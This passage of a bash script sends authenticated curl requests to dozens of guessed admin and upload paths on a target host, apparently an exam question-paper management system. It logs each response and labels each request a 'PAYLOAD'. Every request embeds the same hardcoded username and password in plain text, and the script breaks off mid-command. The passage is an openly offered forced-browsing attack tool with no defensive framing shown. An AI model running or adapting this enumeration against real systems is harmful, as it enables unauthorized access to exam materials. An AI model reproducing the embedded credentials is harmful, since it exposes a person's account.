code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperDataUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperDataUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperDataUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkMonitoringTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkMonitoringTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkMonitoringTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Suite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Suite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Suite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperDashboard/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperDashboard/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperDashboard/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-Handler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-Handler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-Handler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Processing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Processing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Processing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQ_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQ_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQ_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_ProcessingSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_ProcessingSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_ProcessingSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Uploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Uploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Uploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_Handler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_Handler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_Handler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Processing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Processing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Processing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingManagement/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingManagement/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingManagement/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-Admin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-Admin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-Admin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_AutoUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_AutoUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_AutoUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperAccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperAccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperAccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Service/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-Service/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Service/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataAutomationSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
